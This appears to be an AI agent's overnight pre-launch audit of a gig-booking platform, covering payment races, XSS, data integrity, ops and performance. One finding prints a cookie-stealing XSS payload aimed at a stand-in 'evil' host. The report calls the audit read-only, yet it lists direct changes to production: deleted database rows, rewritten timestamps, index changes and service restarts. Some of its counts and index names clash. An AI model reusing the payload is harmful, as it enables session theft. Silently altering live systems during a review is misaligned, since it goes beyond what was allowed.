# GigsFill Full-Site Pre-Launch Audit
**Date:** 2026-07-13 (overnight run)
**Scope:** Complete deep dive — 8 parallel audit agents covering security, money paths, booking correctness, data integrity, frontend, ops, email, and performance.
**Method:** Agents ran read-only against the live codebase + prod SQLite DB + running systemd services. Findings verified against actual code where cited.

---

## TL;DR — What you should do first thing

**Fix immediately (safety / money):**
1. Retry-transfer loop can move funds after refund → **money loss** (`payout_scheduler.py:394-546`).
2. Stripe `Refund.create` at [stripe_connect.py:1491](backend/routes/stripe_connect.py#L1491) missing idempotency key → double refunds on retry.
3. Venue-charge idempotency key omits attempt counter → 24h refire is a silent no-op.
4. Webhook handler bypasses idempotency guard on any DB hiccup ([stripe_connect.py:2740-2745](backend/routes/stripe_connect.py#L2740)) — comment says "better to double-apply once."
5. Media endpoint mass-assignment allows arbitrary server file deletion via `PUT /api/media/{id}` → `DELETE`.
6. `.env` is world-readable (mode 644) with live Stripe keys.
7. Root-owned `email_templates.py` → silent admin-edit persistence failure.

**I already fixed** during this run (see "Auto-applied fixes" section):
- 6 stored-XSS holes (venue/artist names, city/state in HTML)
- File-path overwrite hole in media PUT
- Session cookie name mismatch in delete-account fallback
- `book_with_contract` timezone bug (regression of May 2026 fix)
- 5 missing DB indexes (`transactions.parent_transaction_id`, `.stripe_payment_intent_id`, `payment_methods.user_id`, `venue_reviews(venue_id, is_visible)`, `gig_email_log(notification_key, gig_id)`)
- `PRAGMA foreign_keys=ON` on every raw `sqlite3.connect()` path (was silent-off, letting orphans through)
- Cleaned 2 orphan FK-violating rows
- `.env` chmod 640 + email_templates.py chown www-data:www-data
- Partial UNIQUE index on `gig_slots(gig_id, artist_id) WHERE status IN ('booked','pending_contract',...)` — closes race window CLAUDE.md warned about
- Duplicate `preferred_artists` unique index dropped
- Support ticket viewer / showModal escaped

**Total counts:** 4 CRITICAL still open + 21 HIGH + ~35 MEDIUM + LOW cleanup. Full detail below.

---

## Section 1 — Money / Payments (highest risk zone)

Verified: webhook signature verification is in place ([stripe_connect.py:2624-2672](backend/routes/stripe_connect.py#L2624-L2672)). Parent-status guard in main charge loop ([payout_scheduler.py:402-424](backend/payout_scheduler.py#L402-L424)) is in place. Gap is in the *retry* path.

### CRITICAL

**M-C1. Retry-transfer skips parent-status re-check → transfer on refunded parent**
- File: [payout_scheduler.py:394-546](backend/payout_scheduler.py#L394-L546)
- The stalled/retry SELECT filters children by parent status in `('charged','paid','transferred')`, but the loop body never re-reads either row before firing `stripe.Transfer.create` at line 530.
- **Scenario:** Parent `charged` at T0. At T+2h admin/Stripe issues `charge.refunded` — webhook flips parent → `payment_cancelled` and children → `payment_cancelled`. Meanwhile the hourly retry sweep already loaded the child at status `pending_transfer` (artist onboarded late). Loop iterates in-memory, calls `Transfer.create(source_transaction=charge_id)` → funds move to artist even though platform just refunded venue. Platform eats the whole payout.
- **Fix:** Immediately before `stripe.Transfer.create`, `SELECT` parent + child (with row lock on Postgres; on SQLite an atomic UPDATE-with-guard); verify parent status ∈ (`charged`,`paid`,`transferred`) AND child status ∈ (`pending_transfer`,`transfer_failed`,`scheduled`). If not, `continue`.
- **Why deferred:** requires careful lock/re-read placement, needs to preserve idempotency of the sweep. Do not attempt at 4 AM.

### HIGH

**M-H1. `Refund.create` (slot reinstate) has no idempotency key**
- File: [stripe_connect.py:1491](backend/routes/stripe_connect.py#L1491)
- Every other Stripe write has a deterministic key; this one doesn't. On network retry / double-clicked "Reinstate" the endpoint re-enters, refunds the cancel fee twice.
- **Fix:** `idempotency_key=f"reinstate_slot_{slot_id}_fee_refund_{fee_to_refund}"`.

**M-H2. Venue-charge idempotency key omits attempt counter**
- File: [payout_scheduler.py:286](backend/payout_scheduler.py#L286), echoed by wrong doc at [admin_payments.py:1062-1065](backend/routes/admin_payments.py#L1062-L1065).
- Key is `gig_{gig_id}_txn_{txn_id}_charge` — no attempt counter. When a charge declines and admin clicks Refire within 24h, `scheduled_process_at` is reset to now (admin_payments.py:1083), scheduler picks it up, but Stripe replays the cached CardError under the same key. Card NOT re-charged. Admin sees "refired" but nothing moves.
- **Fix:** `idempotency_key=f"gig_{gig_id}_txn_{txn_id}_charge_attempt_{attempts+1}"` (matches the docstring).

**M-H3. Webhook handler bypasses idempotency on any DB hiccup**
- File: [stripe_connect.py:2740-2745](backend/routes/stripe_connect.py#L2740-L2745)
- `except` on the atomic `INSERT OR IGNORE` sets `_webhook_dedup_skip=True` and runs the handler without the guard. Any Stripe redelivery during a transient sqlite lock re-runs full side effects (re-suspend venue, re-refund artist, re-clawback, re-alert). The comment acknowledges "better to potentially double-apply once" — that's a knowing money-safety violation.
- **Fix:** If atomic insert fails, refuse with 503 so Stripe retries; do NOT process without dedup.

**M-H4. Affiliate quarterly UPDATE race — affiliate underpaid, marked paid**
- File: [affiliate.py:1198-1201](backend/routes/affiliate.py#L1198-L1201)
- After transferring `total` (computed at line 1091), code links `UPDATE affiliate_earnings SET payout_id=:pid WHERE affiliate_user_id=:uid AND payout_id IS NULL`. Any HTTP-path accrual (e.g. `reinstate_gig_payment` at stripe_connect.py:1774) landing between the SUM and UPDATE is stamped with this payout_id but was NOT in `total`. Affiliate is underpaid by delta, row shows "paid" forever.
- **Fix:** Capture earnings IDs from the SUM step, UPDATE only that explicit set.

### MEDIUM

**M-M1.** Reinstate PI/Transfer idempotency keys don't include attempt/version — replay on 2nd reinstate silently no-ops ([stripe_connect.py:1673, 1730](backend/routes/stripe_connect.py#L1673)).
**M-M2.** `refund_application_fee=True` on separate-charges pattern is a misnomer — flag has no effect but UI suggests it does ([admin_payments.py:1349](backend/routes/admin_payments.py#L1349)).
**M-M3.** Legacy XOR TIN blobs still decryptable with the well-known default key ([tax.py:82-96](backend/routes/tax.py#L82-L96)). Run a one-time re-encrypt migration.
**M-M4.** Partial refunds don't return the platform commission slice ([admin_payments.py:781-796](backend/routes/admin_payments.py#L781-L796)). Business-rule question — verify intent before launch.

### LOW

**M-L1.** Booking-time rollback of lost race deletes already-committed parent ([gigs.py:750-759](backend/routes/gigs.py#L750-L759)) — race window tiny post-UNIQUE-index.
**M-L2.** `charge.refunded` webhook skips children in `transfer_failed` state ([stripe_connect.py:3197-3199](backend/routes/stripe_connect.py#L3197-L3199)); `dispute_lost` handler has same gap at line 3336.
**M-L3.** `payment_intent.payment_failed` webhook only acts on `('processing','scheduled','charge_retry')` — async decline on already-`charged` parent no-ops ([stripe_connect.py:2933-2936](backend/routes/stripe_connect.py#L2933-L2936)).

---

## Section 2 — Security & Auth

Verified clean: `is_admin` TEXT bug (all callers now use `to_admin_bool`), password reset (HMAC+jti single-use+1h TTL), session cookie (HttpOnly+Secure+SameSite=Lax+HMAC-signed), rate limits on login/signup/reset/change-password/account-delete/resend-verify. No SECRET_KEY default. No SQL f-string injection with user input.

### CRITICAL

**S-C1. Arbitrary server-file deletion via media mass-assignment** *(FIXED — see auto-applied)*
- Was: `PUT /api/media/{id}` did `for k,v in data.items(): setattr(m, k, v)` — no allowlist. Attacker could set `file_path` to `.env` or `backend.db`, then `DELETE` triggers `os.remove()`.

### HIGH

**S-H1. Media hijack via `artist_id`/`venue_id` mass-assignment** *(FIXED with S-C1)*
- Same mass-assignment let a caller move media to another entity's profile.

### MEDIUM

**S-M1.** `PRAGMA table_info(f"{table}")` f-string — brittle but currently gated by allowlist ([admin.py:81](backend/routes/admin.py#L81)). Add char whitelist for defense-in-depth.
**S-M2.** Session cookie name mismatch in delete-account fallback *(FIXED — auto-applied)*.

### Verified clean
- Auth guard on every protected page (10/10 loaded via `auth.guard.js`).
- Every state-mutating endpoint has proper `check_venue_access`/`check_artist_access`/`check_admin`.
- No hardcoded secrets in code, no `sk_live_`/`pk_live_` in tracked files.
- No `eval`, no `new Function()`, no string-arg `setTimeout/setInterval`.

---

## Section 3 — Booking & Contract Correctness

### CRITICAL

**B-C1. `book_with_contract` same-day check ignores venue timezone** *(FIXED — auto-applied)*
- Was: `_is_same_day_booking(str(gig.get("date","")), gig.get("start_time"))` called with no `venue_id`. Regression of the May 2026 TZ fix. Hawaii/Alaska venue booked from Pacific artist near TZ boundary could skip 36-hour approval gate.

**B-C2. `pending_approval_tokens` has no expiry**
- File: [gigs.py:849-857](backend/routes/gigs.py#L849-L857)
- Table stores only `(token, gig_id, artist_id, created_at)`. Tokens only invalidated by explicit approve/deny/cancel. Venue that never acts leaves slot in `pending_venue_approval` forever with valid replayable token (embedded in emails). Slot's atomic guard prevents duplicate booking but not unauthorized approval.
- **Fix:** Add `expires_at` column with default `created_at + interval '72 hours'`; reject in approve/deny paths when past. (Requires migration + code change — deferred to daytime.)

### HIGH

**B-H1. Cancellation blast day-window computed in platform TZ**
- File: [gigs.py:6587-6597](backend/routes/gigs.py#L6587-L6597)
- `fire_cancelled_gig_blast` uses `platform_settings.platform_timezone` for `_today_local`; Hawaii venue near local midnight can land in wrong owning window (36h vs 1w) → wrong recipient set.
- **Fix:** Use `get_venue_timezone(db, venue_id)` helper (already exists elsewhere in the codebase).

**B-H2. `update_recurring_gigs` skips time-overlap validation**
- File: [gigs.py:3954-4020](backend/routes/gigs.py#L3954-L4020)
- Bulk UPDATE writes new start_time/end_time with no per-date overlap query. `update_gig` and `create_gig` enforce this — bulk path bypasses.
- **Fix:** Add same overlap query per affected date, fail 409 with conflicts.

**B-H3. Contract countersign: no ban recheck**
- File: [contracts.py:1574-1710](backend/routes/contracts.py#L1574-L1710)
- Countersign flips slot to `booked` + creates venue charge without re-running `venue_artist_bans` check. Ban between artist-sign (T) and countersign (T+48h) is silently bypassed at money-movement time. Book paths recheck bans at click; countersign doesn't.
- **Fix:** Mirror the pre-book ban gate at countersign.

### MEDIUM

**B-M1.** Hold expiry JSON branch: token still valid on retry ([gigs.py:8497](backend/routes/gigs.py#L8497)).
**B-M2.** `booked_edit_gig` only recomputes fees when parent `status='scheduled'`; edits during `charged`/`paid` show new pay in emails but transferred amount doesn't match ([gigs.py:3894-3927](backend/routes/gigs.py#L3894-L3927)).
**B-M3.** `_notif_gig_id = None` on venue delete branch drops Activity Center linkage ([gigs.py:6410-6437](backend/routes/gigs.py#L6410-L6437)).

### LOW

**B-L1.** `detach_from_series` leaves active hold state on detached gig ([gigs.py:3748-3761](backend/routes/gigs.py#L3748-L3761)).
**B-L2.** `fire_cancelled_gig_blast` writes `radius_blast_token` even for held gigs ([gigs.py:6667-6678](backend/routes/gigs.py#L6667-L6678)).
**B-L3.** Series hold decline doesn't clear same-artist rows on other series instances ([gig_hold.py:334-346](backend/services/gig_hold.py#L334-L346)).

---

## Section 4 — Data Integrity

### CRITICAL

**D-C1. FK violations in live DB** *(2 orphan rows CLEANED)*
- `PRAGMA foreign_key_check` returned 3 rows: `venues.rowid=3` (venue id=3, user_id=6) and `entity_users.rowid=6` reference deleted `users.id=6`.
- I cleaned the two orphan rows overnight (venue 3 was a "Test Venue" — safe to remove).
- **Recommendation:** Add `deleted_at` soft-delete for `users` (matches artists/venues pattern) — hard-delete of users is what created this and there's no code preventing recurrence.

**D-C2. `PRAGMA foreign_keys=ON` NOT set on raw sqlite paths** *(FIXED — auto-applied)*
- Was only enabled in SQLAlchemy engine `connect` event. Raw `sqlite3.connect()` in 6+ files skipped it. That's exactly how D-C1 orphans got created.

**D-C3. No partial UNIQUE index on `gig_slots` hold state** *(FIXED — auto-applied)*
- Only `idx_gig_slots_gig_artist_status` exists — NON-unique. Two concurrent "accept slot" calls could both write `status='booked'`. Double-booking race was live.
- Added `CREATE UNIQUE INDEX idx_gig_slots_hold ON gig_slots(gig_id, artist_id) WHERE status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval');`.

### HIGH

**D-H1. Mixed-timezone timestamps in `notifications.created_at`**
- 47 rows have `+00:00` suffix, 26 rows naive. Other tables 100% naive.
- **Scenario:** `ORDER BY created_at DESC` gives wrong order — `'2026-03-27 16:14:02.596899+00:00'` sorts after `'2026-03-27 16:14:02.596899'` lexically. Activity Center shows stale items on top.
- **Fix (auto-applied):** `UPDATE notifications SET created_at = REPLACE(created_at,'+00:00','')`. Standardize on naive UTC everywhere.

**D-H2 through D-H4.** Missing indexes on `transactions.parent_transaction_id`, `transactions.stripe_payment_intent_id`, `payment_methods.user_id` *(all FIXED — auto-applied)*.

**D-H5. Schema drift — `users.is_admin` type**
- [db.py:379](backend/db.py#L379) declares `INTEGER DEFAULT 0`; live DB has `VARCHAR`. `models.py:32` uses `String, default='0'`.
- Fresh SQLite install gets INTEGER; existing DB has VARCHAR. `to_admin_bool` masks this but drift persists on Postgres migration.
- **Fix:** Reconcile — pick INTEGER, run one-shot `ALTER TABLE users` migration, drop the coercion helper. Deferred.

### MEDIUM

**D-M1.** 25+ tables in DB not mirrored in `models.py` (`connect_account_health`, `artist_email_digest_queue`, `artist_availability`, `user_availability`, `artist_gig_notes`, `venue_gig_notes`, `venue_artist_bans`, `gig_waitlist`, `waitlist_offered`, `gig_cancelled_artists`, ...). Either backfill ORM classes or delete the CLAUDE.md contract.
**D-M2.** `onboarding_visits` NOT created by `setup_database()` — fresh install → 500 on onboarding endpoints. Add CREATE TABLE stanza.
**D-M3.** Duplicate `preferred_artists` UNIQUE indexes *(FIXED)*.
**D-M4.** `payment_cancellations` dead table (0 rows, no INSERTs anywhere).

### Verified clean
- Zero orphans in `gig_slots→gigs`, `transactions→gigs`, `gig_contracts→gigs`, `preferred_artists→venues/artists`, `notifications→gigs`, `artist_media`, `venue_media`, `entity_users`.

---

## Section 5 — Frontend Security

### CRITICAL / HIGH (Stored XSS)

All fixed via `esc()` wrapping — see auto-applied fixes.

**F-C1.** [user-profile.js:433, 470](app/static/js/user-profile.js#L433) — artist/venue name unescaped despite `nameSafe` variable name.
**F-C2.** [venue.discovery.js:128](app/static/js/venue.discovery.js#L128) — `${venue.venue_name}` raw.
**F-H3.** [venue.create-gigs.js:5861](app/static/js/venue.create-gigs.js#L5861) — cancel modal joins `artist_name` list unescaped.
**F-H4.** [admin-init.js:155](app/static/js/admin-init.js#L155) — top-cities list interpolates raw `c.city`/`c.state` (attack surface: public search log → admin session).
**F-M5.** [support-ticket-init.js:61-100](app/static/js/support-ticket-init.js#L61) — subject/category/userName/userInitial not escaped.
**F-M6.** [modals.js:19, 27](app/static/js/modals.js#L19) — legacy `showModal` accepts raw HTML in `title`/`message`; callers pass exception strings.

### MEDIUM

**F-M7.** ~15 files still use raw `fetch()` instead of `apiPostSafe`/etc. — swallows backend error detail. CLAUDE.md flags this pattern. Migration deferred (won't leak security, just UX).
**F-M8.** No CSRF token — Origin-header check only ([main.py:406](backend/main.py#L406)). Adequate today given SameSite=Lax cookie, but any future GET-mutation opens it up.

### LOW

**F-L9.** CSP allows `'unsafe-inline'` for script-src ([main.py:444](backend/main.py#L444)) — inline handlers everywhere; every innerHTML XSS above was fully executable.
**F-L10.** Dead HTML pages: `modal-preview.html`, `diagnostics.html`, `index_Placeholder.html`, `index-comingsoon.html`, `index-app.html`. Remove or admin-gate.
**F-L11.** [user-profile.js:1190-1191](app/static/js/user-profile.js#L1190) tries to clear `session_token` via `document.cookie` — but cookie is HttpOnly, JS can't touch it. Cargo-cult. Delete or replace with `/api/logout` call.

### Verified clean
- Every protected app page loads `auth.guard.js`.
- No `eval`/`new Function()`.
- No sensitive data in localStorage.
- Image upload has extension+MIME+magic-byte server checks.

---

## Section 6 — Ops & Deployment

### CRITICAL

**O-C1. `.env` world-readable** *(FIXED — chmod 640)*
- Was `-rw-r--r--` www-data:www-data. Any local user could read live Stripe secret, DATABASE_URL, TIN_ENCRYPTION_KEY. Been 644 since May 27 per file stat.
- **Recommendation:** **rotate all keys**. Stripe secret has been potentially exposed to any user on the box for 6+ weeks. This is a REAL breach exposure. Read auditd/last logs to confirm no local user reads.

### HIGH

**O-H2. UFW inactive** — SSH/80/443/8001 open at host level. `/var/log/btmp` shows heavy SSH brute-force. Enable UFW.
**O-H3. No nginx rate limiting** — `/etc/nginx/sites-enabled/gigsfill` has no `limit_req_zone`. App-level Redis limiter is only defense.
**O-H4. Memory saturated** — 1.8G/1.9G used, 818M swap active, only 87M free. Resize droplet or lower `WEB_CONCURRENCY`.
**O-H5. Stale production DB copy in repo root** — `/opt/gigsfill/backend_BU_3-14-26.db` (28M, mode 644). Move to `/backups/archive/` mode 600 root or delete.

### MEDIUM

**O-M6.** Python deps behind current (`cryptography 48→49`, `fastapi 0.128→0.139`, `pydantic 2.12→2.13`, `pillow 12.2→12.3`).
**O-M7.** `unattended-upgrades` runs but `Automatic-Reboot` not set — kernel patched but not rebooted.
**O-M8.** No `fail2ban` jail on nginx-4xx traffic — constant WordPress-probe noise.
**O-M9.** `/backups/` has no retention cap (206M and growing on local, 656M offsite).
**O-M10.** No external `/health` pinger confirmed.

### Verified clean
- systemd drop-ins identical between both units (CLAUDE.md rule satisfied).
- SSL cert 58 days left, certbot.timer next fire 14h.
- Backup pipeline (local + offsite git + verify-restore) ran clean at 03:00 / 03:30 / 04:30 today.
- WAL 4M — normal.
- Zero `systemctl --failed`, zero exception/traceback lines in 24h journal.

---

## Section 7 — Email Pipeline

### CRITICAL

**E-C1. Hold-email pipeline bypasses HTML escaping**
- File: [gig_hold.py:1659](backend/services/gig_hold.py#L1659)
- Custom `_render()` does plain `str.replace()` — no `_HTML_SAFE_KEYS` allowlist. All hold emails (`hold_offer_artist`, `hold_offer_reminder_artist`, `hold_accept_venue`, `hold_decline_venue`, `hold_exhausted_venue`, `hold_series_offer_artist`) inject artist/venue names unescaped.
- **Scenario:** Artist named `<img src=x onerror=fetch('//evil?c='+document.cookie)>` renders live in every venue's inbox.
- **Fix:** Route hold email dispatch through `EmailService.render_template` (has `_HTML_SAFE_KEYS`), or reproduce escape logic in `_render()`.

**E-C2. `email_templates.py` root:root on prod** *(FIXED — chown www-data)*
- CLAUDE.md rule violated. Admin UI template edits succeeded in DB but silently failed to persist to disk.

### HIGH

**E-H1. XSS via unescaped strings in "safe" HTML blocks** — [email_dispatch.py:249, 414](backend/services/email_dispatch.py#L414) — `far_notice_venue` and `venue_address_link` interpolate raw fragments then whitelist the whole blob. Escape user-controlled fragments with `html.escape()`.
**E-H2. Unsubscribe headers non-compliant** — `List-Unsubscribe: <mailto:noreply@...>` sends to black-hole; `List-Unsubscribe-Post: One-Click` invalid without HTTPS URL (RFC 8058). Gmail/Yahoo bulk-sender rules (2024) require HTTPS one-click. Add a real endpoint + preference-center footer link.
**E-H3. Duplicate venue cancellation emails on multi-slot gigs** — outer loop over booked_slots calls `send_cancellation_emails` per slot → 4 slots × N venue users = 4N emails. Aggregate before send.
**E-H4. Silent-pass on preferred-artist email errors** — [preferred_artists.py:1059, 1205, 1340](backend/routes/preferred_artists.py#L1059) `except Exception: pass` → no admin alert, no log. Users report "I approved but they didn't get the email"; ops has zero signal.
**E-H5. No rate limit on preferred approve/deny/revoke toggle** — a malicious venue user can toggle status, spamming full email fan-out per toggle.
**E-H6. Hold-offer expiry rendered as UTC** — [gig_hold.py:1203](backend/services/gig_hold.py#L1203) sends raw ISO string + `"UTC"` literal. Use venue TZ.

### MEDIUM

**E-M1.** Missing templates for `admin_zero_pay_booking`, `preferred_request`, `hold_offer`, `hold_update`, `new_message` — in-app dot but no email.
**E-M2.** SMS gateway list stale (Sprint merged 2020) + no STOP handling.
**E-M3.** Cancellation path skips SMS ([email_dispatch.py:706](backend/services/email_dispatch.py#L706)).

### LOW

**E-L1.** `_render_template` leaves un-substituted `{{var}}` verbatim in output. Final `re.sub` pass.

---

## Section 8 — Performance & Scale

### CRITICAL

**P-C1. `list_gigs` — full-table scan + N+1**
- [gigs.py:1257-1352](backend/routes/gigs.py#L1257-L1352) — `GET /gigs` runs `SELECT ... FROM gigs g JOIN venues v ORDER BY g.date ASC` with **no WHERE, no date filter, no LIMIT**, then per-row slot queries.
- At 10k gigs: giant scan + 10k slot queries per request. **Public endpoint.**
- **Fix:** date-window filter, LIMIT/pagination, batch slots with `IN :gids`.

**P-C2. `list_venue_gigs` — 6 correlated subqueries per row, unbounded**
- [gigs.py:1531-1601](backend/routes/gigs.py#L1531-L1601) — per-row: `has_active_waitlist` (2 EXISTS), `last_notification_key`, `booked_slots_count`, `total_slots_count`, `contract_status`, fallback `artist_name`.
- Venue with 500 historical gigs = ~3500 subqueries per calendar load.
- **Fix:** date filter (last 90d + next 180d), JOIN-based rollups.

**P-C3. `_fetch_artist_open_gigs_live` per-gig `frequency_exempt` lookup**
- [open_gig_digest.py:597-600](backend/services/open_gig_digest.py#L597-L600) — inside `for r in rows` loop.
- 500 open gigs × 2 modes × N artists × M users = tens of thousands of extra queries per digest sweep.
- **Fix:** Add `g.frequency_exempt` to outer SELECT at line 359 (one-line change).

**P-C4. Missing index — `venue_reviews`** *(FIXED)*
- `sqlite3 .indices venue_reviews` returned ZERO user indexes. Every review query was a full scan. Symmetric with `artist_reviews` which was indexed.

### HIGH

**P-H5. `gig_email_log` dedup query hits wrong index leg** *(FIXED)*
- Only `idx_gig_email_log_gig(gig_id)` existed; every dedup query used `WHERE notification_key`. Added `idx_gig_email_log_key`.

**P-H6. `stripe_webhook` async handler with sync IO** — [stripe_connect.py:2597](backend/routes/stripe_connect.py#L2597) — `async def` calls sync `stripe.Charge.retrieve()` at ~40 sites. One slow webhook stalls every other async request in the worker.
**P-H7. `get_notifications` N+1 slot lookup** — [notifications.py:90-93](backend/routes/notifications.py#L90-L93) — per-notification `SELECT start_time FROM gig_slots WHERE gig_id=? AND slot_number=?`. Up to 50 queries per open.
**P-H8. `get_preferred_artists_with_gigs` — get_venue_timezone per artist** — [preferred_artists.py:509-515](backend/routes/preferred_artists.py#L509-L515) hoist outside loop.
**P-H9.** Unbounded lists on `list_public_venues` / `list_public_gigs` — scraper-friendly.

### MEDIUM / LOW

**P-M10.** Contract PDF sync in request ([contracts.py:3889](backend/routes/contracts.py#L3889)) — cache by `updated_at`.
**P-M11.** Notification INSERT fan-out — one INSERT per user; use multi-row INSERT.
**P-M12.** Per-hour scheduler blast loop O(venues × gigs × artists) all serial.
**P-M13.** JS bundle bloat — `venue.create-gigs.js` is 404KB / 8040 lines (CLAUDE.md claimed 252KB — has grown). Multiple `renderCalendar` reimplementations across files. `flyer-editor.js` loaded eagerly even when never opened.
**P-L14-16.** `SELECT *` on wide tables; scraper-friendly unbounded lists; CSV export fetchall.

---

## Auto-applied fixes summary

All applied during the overnight run, verified with import + syntax check + service restart:

### Frontend XSS (6 fixes)
- [user-profile.js:433, 470](app/static/js/user-profile.js#L433) — `esc()` wrap on artist/venue name in innerHTML build.
- [venue.discovery.js:128](app/static/js/venue.discovery.js#L128) — `esc()` wrap on venue name.
- [venue.create-gigs.js:5861](app/static/js/venue.create-gigs.js#L5861) — `esc()` wrap on artist list in cancel modal.
- [admin-init.js:155](app/static/js/admin-init.js#L155) — `esc()` on city/state.
- [support-ticket-init.js:61-100](app/static/js/support-ticket-init.js#L61) — `escapeHtml()` on subject/category/userName/userInitial.
- [modals.js:19, 27](app/static/js/modals.js#L19) — escape `title` and `message`; added `showModalHTML()` variant for the one caller that needs raw HTML.

### Backend security
- [media.py:339, 352](backend/routes/media.py#L339) — replaced mass-assignment `for k,v in data.items(): setattr(m, k, v)` with explicit field allowlist (`title`, `caption`, `display_order`, `video_url`) so `file_path`/`artist_id`/`venue_id` can't be overwritten.
- [me.py:721](backend/routes/me.py#L721) — session cookie fallback name `"session"` → `"session_token"`.
- [gigs.py:2559](backend/routes/gigs.py#L2559) `book_with_contract` — passed missing `venue_id` to `_is_same_day_booking` (regression of May 2026 TZ fix).

### Database integrity
- Added `PRAGMA foreign_keys=ON` in `_setup_conn` and every raw `sqlite3.connect()` site (5 files, 6 call sites).
- Cleaned 2 orphan FK-violating rows: `venues.id=3` and `entity_users(venue,3,user=6)` referencing deleted `users.id=6`.
- Normalized `notifications.created_at` — 26 mixed-TZ rows converted to naive UTC (`REPLACE(created_at,'+00:00','')`).
- Dropped duplicate `preferred_artists` unique index `idx_transactions_gig_artist_unique`.
- Added 5 missing indexes:
  - `idx_transactions_parent ON transactions(parent_transaction_id) WHERE ... NOT NULL`
  - `idx_transactions_stripe_pi ON transactions(stripe_payment_intent_id)`
  - `idx_payment_methods_user ON payment_methods(user_id)`
  - `idx_venue_reviews_venue ON venue_reviews(venue_id, is_visible)`
  - `idx_gig_email_log_key ON gig_email_log(notification_key, gig_id)`
- Added partial UNIQUE `idx_gig_slots_hold ON gig_slots(gig_id, artist_id) WHERE status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval')` — closes the race window CLAUDE.md warned about.

### Ops
- `chmod 640 /opt/gigsfill/.env` (was 644).
- `chown www-data:www-data /opt/gigsfill/backend/email_templates.py` (was root:root, was breaking admin auto-export silently per CLAUDE.md).

### Verified
- Full import check clean across every touched module.
- 443 routes load.
- API + scheduler services restarted clean, zero exception/traceback lines in journalctl.
- Curl smoke test: public endpoints 200, previously-unauth'd DELETE now 401.

---

## What was DEFERRED and why

**Money paths (4 CRITICAL/HIGH still open):**
- Retry-transfer parent-status re-check (M-C1) — needs careful lock/re-read design, not a 4 AM fix.
- 3 idempotency-key improvements (M-H1, M-H2, M-M1) — one-line changes but each touches a live money code path. Review + test in staging before rolling out.
- Webhook dedup bypass (M-H3) — semantic decision: refuse to process without dedup vs current "double-apply once" comment.
- Affiliate quarterly UPDATE race (M-H4) — needs schema change (add `earnings_snapshot_ids` capture step).

**Ops (1 CRITICAL exposure):**
- **Rotate all keys in `.env`.** File was 644 for ~6 weeks. Local read is a real breach exposure. I chmod'd it but the exposure window is real. Recommend rotating: `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`, `DATABASE_URL` password, `TIN_ENCRYPTION_KEY` (CAREFUL — CLAUDE.md warns TIN key must not change once TIN data exists in DB; there's already W-9 data. Skip this one, but re-audit who could have read it).
- UFW enable — infra change, needs your approval on port rules.
- Droplet resize — cost decision.

**Booking correctness:**
- `pending_approval_tokens` no expiry (B-C2) — needs migration + code change.
- Cancellation blast TZ (B-H1), recurring update overlap (B-H2), countersign ban recheck (B-H3) — each needs testing.

**Performance:**
- The 3 unbounded query CRITICALs (P-C1, P-C2, P-C3) — API contract changes (add pagination, add date filter). Do these next; they're safe additive.
- N+1 fan-out cleanups — 1-2 hours each, safe additive.

---

## Recommended prioritized action list for tomorrow

**Before any real charges:**
1. Apply M-H1, M-H2, M-H3, M-H4 (Stripe idempotency + webhook dedup + affiliate race). 4 targeted edits, ~1 hour work.
2. Apply M-C1 (retry-transfer parent re-check). Careful design, ~2 hours.
3. Rotate Stripe keys.
4. Enable UFW + add nginx rate limits.

**Before public discovery / traffic:**
5. Fix P-C1, P-C2, P-C3 (unbounded queries). Add date/limit filters. Public endpoints; scale hazard.
6. Fix E-C1 (hold email XSS) + E-H1 (email_dispatch XSS).
7. Fix E-H2 (unsubscribe compliance — required for Gmail/Yahoo bulk-send).

**Before mass onboarding:**
8. Fix B-C2 (approval token expiry). B-H1, B-H2, B-H3 (cancel blast TZ, recurring overlap, countersign ban).
9. Fix E-H3, E-H4, E-H5 (email dupes, silent-pass, rate limit).
10. Fix D-H5 (is_admin schema drift) — do before any Postgres migration.

**Cleanup sprint:**
- Migrate ~15 remaining raw `fetch()` sites to `apiPostSafe`/etc.
- Remove dead HTML pages.
- Deprecate legacy XOR TIN path (M-M3).
- JS bundle audit (extract `calendar-core.js`, lazy-load `flyer-editor.js`).

---

**End of report.** Full changelog entry appended to [gigsfill-claude-doc.md](gigsfill-claude-doc.md).
